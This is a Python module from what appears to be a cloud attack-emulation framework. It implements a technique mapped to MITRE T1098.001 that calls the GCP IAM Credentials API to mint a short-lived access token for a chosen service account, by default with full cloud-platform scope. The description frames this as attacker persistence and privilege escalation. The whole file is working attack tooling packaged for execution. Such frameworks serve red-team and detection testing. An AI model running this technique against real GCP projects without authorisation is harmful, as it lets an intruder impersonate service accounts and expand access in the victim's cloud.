from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, TechniqueNote, TechniqueReference
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any, Tuple

from core.gcp.gcp_access import GCPAccess
# from google.cloud import resourcemanager_v3
from google.cloud import iam_credentials_v1

@TechniqueRegistry.register
class GCPPersistenceGenerateSAShortLivedToken(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.001",
                technique_name="Account Manipulation: Additional Cloud Credentials",
                tactics=["Persistence", "Privilege Escalation"],
            )
        ]

        technique_references = [
            TechniqueReference(ref_title = "GCP Generate Short Lived Tokens Documentation", ref_link = "https://docs.cloud.google.com/iam/docs/create-short-lived-credentials-direct#sa-credentials-oauth"),
            TechniqueReference(ref_title = "GCP Generate Short Lived Tokens API", ref_link = "https://docs.cloud.google.com/iam/docs/reference/credentials/rest/v1/projects.serviceAccounts/generateAccessToken")
        ]

        super().__init__("Generate Service Account Short-Lived Token", "Generate a short-lived access token for a Google Cloud Platform service account using the IAM Credentials API. This technique allows attackers to obtain temporary credentials that can be used to access GCP resources, potentially escalating their privileges or maintaining persistence within the cloud environment. By leveraging the IAM Credentials API, attackers can create access tokens with specific scopes, enabling them to perform actions on behalf of the compromised service account. The technique handles API interactions and formats the output for easy analysis.", mitre_techniques=mitre_techniques, references=technique_references)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            service_account_email: str = kwargs.get('service_account_email')
            scopes: list = kwargs.get('scopes', None)

            if not scopes:
                scopes = [
                    "https://www.googleapis.com/auth/cloud-platform"
                ]
            else:
                scopes = [scope.strip() for scope in scopes.split(",")]

            manager = GCPAccess()
            manager.get_current_access()
            credential = manager.credential

            iam_credential_client = iam_credentials_v1.IAMCredentialsClient(credentials=credential)
            name = f"projects/-/serviceAccounts/{service_account_email}"

            response = iam_credential_client.generate_access_token(
                name=name,
                scope=scopes
            )

            token_info = {
                "access_token": response.access_token,
                "expire_time": response.expire_time.isoformat()
            }

            return ExecutionStatus.SUCCESS, {
                "message": "Short-lived token generated successfully.",
                "value": token_info
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "An error occurred while generating the short-lived token."
            }
    
    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
                "service_account_email": {
                     "type": "str",
                     "required": False,
                     "default": None,
                     "name": "Service Account Email",
                     "input_field_type": "text",
                },
                "scopes": {
                     "type": "str",
                     "required": False,
                     "default": None,
                     "name": "Scopes (comma-separated)",
                     "input_field_type": "text",
                },
        }